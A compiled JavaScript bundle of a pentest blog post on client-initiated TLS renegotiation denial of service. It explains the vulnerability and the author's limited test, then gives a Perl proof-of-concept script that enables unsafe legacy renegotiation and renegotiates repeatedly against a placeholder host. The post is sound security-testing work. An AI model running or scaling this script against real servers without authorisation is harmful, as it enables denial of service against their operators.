"use strict";(self.webpackChunkjanstarke_blog=self.webpackChunkjanstarke_blog||[]).push([[3692],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>_});var r=n(7294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function a(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var c=r.createContext({}),l=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=l(e.components);return r.createElement(c.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},y=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,s=e.originalType,c=e.parentName,u=a(e,["components","mdxType","originalType","parentName"]),p=l(n),y=o,_=p["".concat(c,".").concat(y)]||p[y]||d[y]||s;return n?r.createElement(_,i(i({ref:t},u),{},{components:n})):r.createElement(_,i({ref:t},u))}));function _(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var s=n.length,i=new Array(s);i[0]=y;var a={};for(var c in t)hasOwnProperty.call(t,c)&&(a[c]=t[c]);a.originalType=e,a[p]="string"==typeof e?e:o,i[1]=a;for(var l=2;l<s;l++)i[l]=n[l];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}y.displayName="MDXCreateElement"},176:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>s,metadata:()=>a,toc:()=>l});var r=n(7462),o=(n(7294),n(3905));const s={layout:"post",title:"DoSing TLS endpoints",date:new Date("2021-03-25T00:00:00.000Z"),categories:"pentest perl",authors:["jasa"]},i=void 0,a={permalink:"/blog/2021/03/25/DoSing-TLS-endpoints",source:"@site/blog/2021-03-25-DoSing-TLS-endpoints.md",title:"DoSing TLS endpoints",description:"During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.",date:"2021-03-25T00:00:00.000Z",formattedDate:"March 25, 2021",tags:[],readingTime:2.65,hasTruncateMarker:!1,authors:[{name:"Jan Starke",title:"Senior Forensic Analyst",url:"https://github.com/janstarke",imageURL:"https://github.com/janstarke.png",key:"jasa"}],frontMatter:{layout:"post",title:"DoSing TLS endpoints",date:"2021-03-25T00:00:00.000Z",categories:"pentest perl",authors:["jasa"]},prevItem:{title:"$MFT file parser finalized",permalink:"/blog/2021/05/16/mft2bodyfile"},nextItem:{title:"Pairing based cryptography in Rust",permalink:"/blog/2021/02/13/Pairing_based_cryptography_in_Rust"}},c={authorsImageUrls:[void 0]},l=[],u={toc:l},p="wrapper";function d(e){let{components:t,...n}=e;return(0,o.kt)(p,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability."),(0,o.kt)("h1",{id:"the-vulnerability"},"The vulnerability"),(0,o.kt)("p",null,"Negotiating a shared secret requires a lot of computation and thus needs some CPU time. The idea of the attack is to initiate a TLS connection and then request a renegotiation of the shared secret over and over again. This would consume a lot of CPU time from the server, which is the resource we're going to exhaust."),(0,o.kt)("h1",{id:"the-test"},"The test"),(0,o.kt)("p",null,"To exploit the vulnerability, you must make sure that the client consume much less CPU time than the server does. So, you have to tweak the renegotiation. I didn't do this, becaus I wasn't interested in really exhausting the server resources. I was only interested in the following questions:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Does the server really support client-initiated renegotiation?"),(0,o.kt)("li",{parentName:"ul"},"How many renegotiations are allowed by the server before it terminates the connection?")),(0,o.kt)("h1",{id:"what-did-i-learn"},"What did I learn?"),(0,o.kt)("p",null,"Most TLS implementations have removed the client-initiated renegotiation from its source code, so If you use an up-to-date implementation, chances are good that you are not vulnerable."),(0,o.kt)("h1",{id:"expoit-source-code"},"Expoit source code"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-perl"},'use Socket;\nuse Net::SSLeay qw(die_now die_if_ssl_error) ;\nuse strict;\nuse warnings;\nuse Errno qw(EINTR EIO :POSIX);\nuse IO::Socket::INET;\n\nNet::SSLeay::load_error_strings();\nNet::SSLeay::SSLeay_add_ssl_algorithms();\nNet::SSLeay::randomize();\n\nmy $hostname = "<yourhost>";\nmy $port = "443";\nmy $request = "HEAD / HTTP/1.1\\r\\n\\r\\n";\n\nsub error_name($) {\n    my $id = shift;\n    my @errors = (\n        \'SSL_ERROR_NONE\',\n        \'SSL_ERROR_SSL\',\n        \'SSL_ERROR_WANT_READ\',\n        \'SSL_ERROR_WANT_WRITE\',\n        \'SSL_ERROR_WANT_X509_LOOKUP\',\n        \'SSL_ERROR_SYSCALL\',\n        \'SSL_ERROR_ZERO_RETURN\',\n        \'SSL_ERROR_WANT_CONNECT\',\n        \'SSL_ERROR_WANT_ACCEPT\'\n    );\n    die "invalid error number" unless $errors[$id];\n    my $result;\n    return $errors[$id];\n}\n\nsub display_result($$$) {\n    my $ssl = shift;\n    my $result = shift;\n    my $function = shift;\n\n    die_if_ssl_error("ssl $function ($!)");\n\n    if (0 != (my $error_id = Net::SSLeay::get_error($ssl, $result))) {\n        my $error = error_name($error_id);\n        print ("$function() = $error\\n");\n\n        while (0 != (my $rv = Net::SSLeay::ERR_get_error())) {\n            my $error_desc = Net::SSLeay::ERR_error_string($rv);\n            print ("stack: $error_desc\\n");\n        }\n    }\n}\n\nsub set_options($$) {\n    my $ctx = shift;\n    my $option = shift;\n    Net::SSLeay::CTX_set_options($ctx, $option)\n     and die_if_ssl_error("ssl ctx set options ($!)");\n}\n\nsub set_version($$) {\n    my $ctx = shift;\n    my $version = shift;\n    Net::SSLeay::CTX_set_ssl_version($ctx, $version)\n     and die_if_ssl_error("ssl ctx set version ($!)");\n}\n\nsub set_ciphers($$) {\n    my $ctx = shift;\n    my $ciphers = shift;\n    Net::SSLeay::CTX_set_cipher_list($ctx, $ciphers)\n     and die_if_ssl_error("ssl ctx set ciphers suites ($!)");\n}\n\nsub ssl_connect($$) {\n    my $ctx = shift;\n    my $socket = shift;\n    my $ssl = Net::SSLeay::new($ctx) or die_now("Failed to create SSL $!");\n    Net::SSLeay::set_fd($ssl, $socket->fileno);\n    my $res = Net::SSLeay::connect($ssl) and die_if_ssl_error("ssl connect ($!)");\n    my $error = error_name(Net::SSLeay::get_error($ssl, $res));\n    print ("connect() = $error\\n");\n    print "Cipher `" . Net::SSLeay::get_cipher($ssl) . "\'\\n";\n    return $ssl;\n}\n\nsub configure_context($$) {\n    my $ctx = shift;\n    my $ciphers = shift;\n    set_options($ctx, &Net::SSLeay::OP_ALL);\n    set_options($ctx, &Net::SSLeay::OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);\n    #set_options($ctx, &Net::SSLeay::OP_SSL_OP_LEGACY_SERVER_CONNECT);\n    set_version($ctx, &Net::SSLeay::TLSv1_2_method);\n    set_ciphers($ctx, $ciphers);\n}\nmy $socket = IO::Socket::INET->new(\n    Type => IO::Socket::SOCK_STREAM,\n    Proto => \'tcp\',\n    PeerAddr => $hostname,\n    PeerPort => $port,\n    Blocking => 1\n) or die ("unable to connect: $!\\n");\n\n \nmy $ctx = Net::SSLeay::CTX_new() or die_now("Failed to create SSL_CTX $!");\nconfigure_context($ctx, "DHE:EDH:ECDHE:EECDH:RSA:DH:ECDH");\nmy $ssl = ssl_connect($ctx, $socket);\n\nmy $ret;\nfor (my $i=0; $i<2; $i++) {\n    Net::SSLeay::renegotiate($ssl);\n    die_if_ssl_error("ssl renegotiate ($!)");\n\n    if (! $socket->connected()) {\n        die("network connection has died");\n    }\n\n    $ret = Net::SSLeay::do_handshake($ssl);\n    display_result($ssl, $ret, "do_handshake");\n}\n\nNet::SSLeay::free ($ssl);               # Tear down connection\nNet::SSLeay::CTX_free ($ctx);\nclose $socket;\n')))}d.isMDXComponent=!0}}]);